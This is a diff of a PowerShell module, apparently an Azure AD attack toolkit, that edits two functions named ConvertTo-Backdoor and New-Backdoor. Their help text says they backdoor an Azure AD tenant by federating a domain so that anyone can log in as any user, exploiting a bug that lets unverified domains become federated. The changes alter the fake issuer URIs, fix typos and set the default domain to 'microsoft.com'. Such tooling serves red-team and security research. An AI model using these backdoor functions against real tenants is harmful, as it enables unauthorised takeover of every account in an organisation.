@@ -578,7 +578,7 @@ function ConvertTo-Backdoor
     Opens a backdoor to Azure AD tenant by altering the given domains authentication settings.
     Allows logging in as any user of the tenant.
 
-    The certificate will be configured to be any.sts and issuer http://sts.0nmicrosoft.com/<tenant id>
+    The certificate will be configured to be any.sts and issuer http://any.sts/<8 byte hex-value>
 
     .Parameter AccessToken
     Access Token
@@ -604,20 +604,23 @@ function ConvertTo-Backdoor
     )
     Process
     {
+        # Unique ID
+        $UniqueID = '{0:X}' -f (Get-Date).GetHashCode()
+
         # Get from cache if not provided
         $AccessToken = Get-AccessTokenFromCache($AccessToken)
 
         # Set some variables
         $tenant_id = Get-TenantId -AccessToken $AccessToken
 
-        $LogOnOffUri ="https://sts.0nmicrosoft.com/$tenant_id"
-        $IssuerUri = "http://sts.0nmicrosoft.com/$tenant_id/$DomainName"
+        $LogOnOffUri ="https://any.sts/$UniqueID"
+        $IssuerUri = "http://any.sts/$UniqueID"
 
         $input = read-host "Are you sure to create backdoor with $DomainName`? Type YES to continue or CTRL+C to abort"
         switch ($input) `
         {
             "yes" {
-                # Tries to create a new unvalidated domain
+                # Tries to create a new unverified domain
                 if($Create)
                 {
                     New-Domain -AccessToken $AccessToken -Name $DomainName 
@@ -657,9 +660,9 @@ function New-Backdoor
     Creates a new backdoor to Azure tenant by creating a new domain and by altering its authentication settings.
     Allows logging in as any user of the tenant.
 
-    The certificate will be configured to be any.sts and issuer http://sts.0nmicrosoft.com/<tenant id>
+    The certificate will be configured to be any.sts and issuer http://any.sts/<8 byte hex-value>
 
-    Utilises a bug in Azure AD, which allows convering unverified domains to federated.
+    Utilises a bug in Azure AD, which allows converting unverified domains to federated.
 
     .Parameter AccessToken
     Access Token
@@ -668,7 +671,7 @@ function New-Backdoor
     The domain to be created to be used as a backdoor. If not given, uses default.onmicrosoft.com.
     
     .Example
-    PS C:\>New-AADIntBackdoor -DomainName backdoor.myo365.site
+    PS C:\>New-AADIntBackdoor -DomainName backdoor.company.com
 
 #>
     [cmdletbinding()]
@@ -676,7 +679,7 @@ function New-Backdoor
         [Parameter(Mandatory=$False)]
         [String]$AccessToken,
         [Parameter(Mandatory=$False)]
-        [String]$DomainName="sts.onmicrosoft.com"
+        [String]$DomainName="microsoft.com"
     )
     Process
     {
